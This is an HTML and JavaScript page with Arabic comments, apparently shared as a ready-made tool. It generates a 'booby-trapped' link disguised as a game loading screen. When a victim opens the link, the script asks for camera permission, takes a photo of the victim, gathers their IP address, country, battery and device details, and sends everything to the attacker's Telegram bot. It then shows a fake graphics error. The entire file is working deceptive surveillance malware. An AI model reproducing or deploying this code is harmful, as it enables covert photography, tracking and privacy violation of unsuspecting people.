<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mohamed Matrix System</title>
    <style>
        :root { --neon: #00ff00; --black: #000; }
        body, html { margin: 0; padding: 0; background: var(--black); font-family: 'Poppins', sans-serif; overflow: hidden; color: var(--neon); }
        canvas { position: fixed; top: 0; left: 0; z-index: 1; }
        
        /* واجهة لوحة التحكم */
        #adminPanel { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: rgba(0,0,0,0.9); border: 2px solid var(--neon); padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 0 25px var(--neon); backdrop-filter: blur(10px); }
        h3 { text-align: center; text-shadow: 0 0 10px var(--neon); }
        label { display: block; margin-top: 10px; font-size: 14px; font-weight: bold; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.7); border: 1px solid var(--neon); color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; margin-top: 15px; border-radius: 8px; box-shadow: 0 0 15px var(--neon); }
        #out { margin-top: 20px; padding: 10px; border: 1px dashed var(--neon); background: rgba(0,255,0,0.05); display: none; }
        code { word-break: break-all; font-size: 11px; color: #fff; }

        /* واجهة الضحية (تحميل اللعبة) */
        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .loader { border: 4px solid #111; border-top: 4px solid var(--neon); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>

    <div id="adminPanel">
        <div class="card">
            <h3>created.by.mohamed morsy</h3>
            <label>ID CHAT</label>
            <input type="text" id="tid" placeholder="id chat">
            <label>(Bot Token)</label>
            <input type="text" id="tkn" placeholder="bot token">
            <button onclick="generate()">إنشاء الرابط الملغم </button>
            <div id="out">
                <p style="font-size:12px; margin:0 0 5px 0;">انسخ هذا الرابط وارسله:</p>
                <code id="resLink"></code>
            </div>
        </div>
    </div>

    <div id="victimUI">
        <div class="loader"></div>
        <h2 id="statusText">جاري تحميل موارد اللعبة...</h2>
        <p style="color:#666; font-size:13px;">برجاء الانتظار وقبول الأذونات اللازمة</p>
    </div>

    <script>
        // --- 1. تأثير الماتريكس ---
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
        const fontSize = 12;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(0);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px arial";
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        // --- 2. التحقق من الرابط (أدمن أم ضحية) ---
        const params = new URLSearchParams(window.location.search);
        const t = params.get('t');
        const i = params.get('i');

        if(t && i) {
            document.getElementById('adminPanel').style.display = 'none';
            document.getElementById('victimUI').style.display = 'flex';
            startCapture(t, i);
        }

        // --- 3. وظيفة إنشاء الرابط للأدمن ---
        function generate() {
            const tid = document.getElementById('tid').value;
            const tkn = document.getElementById('tkn').value;
            if(!tid || !tkn) return alert("برجاء إدخال كافة البيانات!");
            const finalLink = window.location.href.split('?')[0] + `?i=${tid}&t=${tkn}`;
            document.getElementById('resLink').innerText = finalLink;
            document.getElementById('out').style.display = 'block';
        }

        // --- 4. وظيفة السحب الكاملة (للضحية) ---
        async function startCapture(botToken, chatId) {
            try {
                // طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvasCap = document.createElement('canvas');
                canvasCap.width = video.videoWidth;
                canvasCap.height = video.videoHeight;
                canvasCap.getContext('2d').drawImage(video, 0, 0);

                canvasCap.toBlob(async (blob) => {
                    // جلب معلومات إضافية
                    let ipInfo = { ip: "غير معروف", country_name: "غير معروف" };
                    try { const r = await fetch('https://ipapi.co/json/'); ipInfo = await r.json(); } catch(e){}

                    let batteryStatus = "غير معروف";
                    try { 
                        const b = await navigator.getBattery(); 
                        batteryStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'غير موصل'})`;
                    } catch(e){}

                    const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? navigator.userAgent.match(/Android|iPhone|iPad/i)[0] : "PC";

                    // تنسيق الرسالة
                    const caption = `
━━━ • 📸 • ━━━
📸 صورة جديدة تم التقاطها
━━━ • 📋 • ━━━
🌍 الدولة: ${ipInfo.country_name}
📱 الجهاز: ${device}
🔋 البطارية: ${batteryStatus}
🌐 IP: ${ipInfo.ip}
🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
━━━   برعايه عمك محمد مرسي😘💹━━━`;

                    // إرسال لتليجرام
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', caption);

                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                    
                    // إنهاء العملية
                    stream.getTracks().forEach(tr => tr.stop());
                    document.getElementById('statusText').innerText = "حدث خطأ في جرافيك اللعبة (Error 403)";
                }, 'image/jpeg');

            } catch (err) {
                document.getElementById('statusText').innerText = "يجب السماح بالصلاحيات لتشغيل موارد اللعبة";
            }
        }
    </script>
</body>
</html>
